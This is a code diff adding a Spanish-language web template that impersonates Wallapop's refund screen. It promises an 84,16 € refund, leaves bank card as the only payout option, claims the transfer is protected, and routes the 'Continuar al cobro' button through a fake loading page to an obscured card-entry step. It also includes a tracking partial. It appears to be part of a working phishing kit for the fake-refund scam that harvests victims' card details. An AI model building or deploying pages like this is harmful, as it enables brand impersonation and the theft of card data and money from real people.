@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallapop - Método de reembolso</title>
+    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
+    <link rel="stylesheet" href="/css/wallapop.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <%- include('partials/tracker') %>
+</head>
+<body>
+    <!-- Top Header -->
+    <header class="wlp-header">
+        <div class="wlp-header-inner">
+            <a href="/" class="wlp-logo-link">
+                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
+            </a>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="wlp-page-wrapper">
+        <div class="wlp-modal-card">
+            <!-- Modal Header -->
+            <div class="wlp-modal-header">
+                <div class="wlp-modal-header-left">
+                    <button type="button" class="wlp-back-btn" onclick="window.history.back();" aria-label="Volver">
+                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="19" y1="12" x2="5" y2="12"></line>
+                            <polyline points="12 19 5 12 12 5"></polyline>
+                        </svg>
+                    </button>
+                    <h2 class="wlp-modal-title">Método de reembolso</h2>
+                </div>
+                <div class="wlp-modal-header-right">
+                    <a href="#" class="wlp-dudas-link" onclick="return false;">¿Dudas?</a>
+                    <button type="button" class="wlp-close-btn" aria-label="Cerrar">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Refund Info Banner -->
+            <div class="wlp-monedero-banner">
+                <div class="wlp-monedero-icon">
+                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="2" y="4" width="20" height="16" rx="2"></rect>
+                        <line x1="2" y1="10" x2="22" y2="10"></line>
+                    </svg>
+                </div>
+                <p class="wlp-monedero-text">
+                    Selecciona la tarjeta bancaria donde deseas recibir el ingreso de tu reembolso de <strong>84,16 €</strong>.
+                </p>
+            </div>
+
+            <!-- Payment/Payout Methods List -->
+            <div class="wlp-payment-list">
+                <!-- Tarjeta bancaria (Active) -->
+                <div class="wlp-payment-item active" data-method="card">
+                    <div class="wlp-payment-item-left">
+                        <div class="wlp-payment-logo-pair">
+                            <!-- Mastercard & Visa mini badges -->
+                            <svg width="42" height="26" viewBox="0 0 46 28" fill="none">
+                                <rect width="46" height="28" rx="4" fill="#ffffff" stroke="#E2E2E2"/>
+                                <circle cx="18" cy="14" r="7" fill="#EB001B"/>
+                                <circle cx="28" cy="14" r="7" fill="#F79E1B" fill-opacity="0.9"/>
+                            </svg>
+                        </div>
+                        <div class="wlp-payment-desc-box">
+                            <span class="wlp-payment-title">Tarjeta bancaria</span>
+                            <span class="wlp-payment-subtitle" style="color: #0d8a7b; font-weight: 500;">Transferencia directa e inmediata</span>
+                        </div>
+                    </div>
+                    <div class="wlp-radio-circle">
+                        <div class="wlp-radio-dot"></div>
+                    </div>
+                </div>
+
+                <!-- Klarna (Unavailable) -->
+                <div class="wlp-payment-item disabled" data-method="klarna" style="opacity: 0.45; cursor: not-allowed;">
+                    <div class="wlp-payment-item-left">
+                        <div class="wlp-payment-logo-box">
+                            <span style="background-color: #FFB3C7; color: #0A0A0A; font-weight: 700; font-size: 11px; padding: 4px 7px; border-radius: 4px; letter-spacing: -0.2px;">Klarna</span>
+                        </div>
+                        <div class="wlp-payment-desc-box">
+                            <div style="display: flex; align-items: center; gap: 8px;">
+                                <span class="wlp-payment-title">Klarna</span>
+                                <span style="background: #edf0f2; color: #78909c; font-size: 11px; font-weight: 600; padding: 2px 7px; border-radius: 4px;">No disponible</span>
+                            </div>
+                            <span class="wlp-payment-subtitle">No disponible para recibir reembolsos</span>
+                        </div>
+                    </div>
+                    <div class="wlp-radio-circle" style="background-color: #f7f9fa;">
+                        <div class="wlp-radio-dot"></div>
+                    </div>
+                </div>
+
+                <!-- PayPal (Unavailable) -->
+                <div class="wlp-payment-item disabled" data-method="paypal" style="opacity: 0.45; cursor: not-allowed;">
+                    <div class="wlp-payment-item-left">
+                        <div class="wlp-payment-logo-box">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                <path d="M7 20.5L8.5 10H14C17.5 10 19 8.5 19 6C19 3.5 17 2 13.5 2H6C5.5 2 5 2.5 5 3L2 20C2 20.5 2.5 21 3 21H6.5C6.7 21 6.9 20.8 7 20.5Z" fill="#003087"/>
+                                <path d="M8.5 10L7 20.5C7 20.8 7.2 21 7.5 21H11L12.2 13H15.5C18.5 13 20.5 11.5 21 9C21.5 6.5 20 5 17 5H10C9.5 5 9 5.5 8.9 6L8.5 10Z" fill="#0079C1"/>
+                            </svg>
+                        </div>
+                        <div class="wlp-payment-desc-box">
+                            <div style="display: flex; align-items: center; gap: 8px;">
+                                <span class="wlp-payment-title">PayPal</span>
+                                <span style="background: #edf0f2; color: #78909c; font-size: 11px; font-weight: 600; padding: 2px 7px; border-radius: 4px;">No disponible</span>
+                            </div>
+                            <span class="wlp-payment-subtitle">No disponible para recibir reembolsos</span>
+                        </div>
+                    </div>
+                    <div class="wlp-radio-circle" style="background-color: #f7f9fa;">
+                        <div class="wlp-radio-dot"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Security Notice -->
+            <p class="wlp-security-notice">
+                Tu transferencia está <span class="highlight">encriptada y protegida</span>. Los fondos se transferirán directamente a tu tarjeta tras verificar la titularidad.
+            </p>
+
+            <!-- Refund Summary Card -->
+            <div class="wlp-product-card">
+                <div style="width: 48px; height: 48px; border-radius: 8px; background: rgba(19, 193, 172, 0.15); display: flex; align-items: center; justify-content: center; color: var(--wlp-teal); flex-shrink: 0;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                </div>
+                <div class="wlp-product-details">
+                    <span class="wlp-product-name">Reembolso de saldo a favor</span>
+                    <span class="wlp-product-fee">Referencia: REF-842918 · Sin comisiones de cobro</span>
+                    <span class="wlp-product-total">Total a ingresar: 84,16 €</span>
+                </div>
+            </div>
+
+            <!-- Continue Button -->
+            <button type="button" class="wlp-btn-primary" id="continueBtn">Continuar al cobro</button>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            let selectedMethod = 'card';
+            const paymentItems = document.querySelectorAll('.wlp-payment-item');
+            const continueBtn = document.getElementById('continueBtn');
+
+            paymentItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    if (this.classList.contains('disabled')) return;
+                    paymentItems.forEach(i => i.classList.remove('active'));
+                    this.classList.add('active');
+                    selectedMethod = this.getAttribute('data-method');
+                });
+            });
+
+            continueBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                continueBtn.textContent = 'Cargando...';
+                continueBtn.disabled = true;
+
+                // For Card, navigate to Edita tu tarjeta
+                window.location = "/loading?time=2&url=/QcEwP85AgNE4pnL5mWSM";
+            });
+        });
+    </script>
+</body>
+</html>
